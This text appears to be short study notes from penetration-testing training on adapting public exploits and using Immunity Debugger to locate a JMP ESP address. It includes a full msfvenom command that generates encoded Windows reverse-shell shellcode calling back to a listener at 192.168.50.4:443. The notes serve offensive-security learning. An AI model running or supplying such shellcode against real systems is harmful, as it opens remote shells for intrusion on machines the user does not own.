To avoid downtime we should always read exploit code carefully, modify as needed and test it against our own sandboxed target when possible.

Sometimes it is useful to port an exploit to a different language to utilize different pre-written libraries and extend exploit functionality.

Sometimes exploits need to be compiled on different systems.

#### Fixing

If our exploit does not work due to the return address not being available or utilizing return addresses of DLLs that are not present - we can further search for other public exploits for the same vulnerability with working return addresses that have been verified by exploitDB.

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"` - replacing shellcode of an exploit to include our own information for a reverse shell. `-b` is bad characters not to be included.


#### Immunity Debugger

1. start service on our host.
2. launch immunity debugger
3. attach to service
4. click view
5. click executable modules - this is where we can confirm which DLLs are available and used in our service we are debugging by checking name and values
6. `ctrl + g` find memory address for JMP ESP and set breakpoint
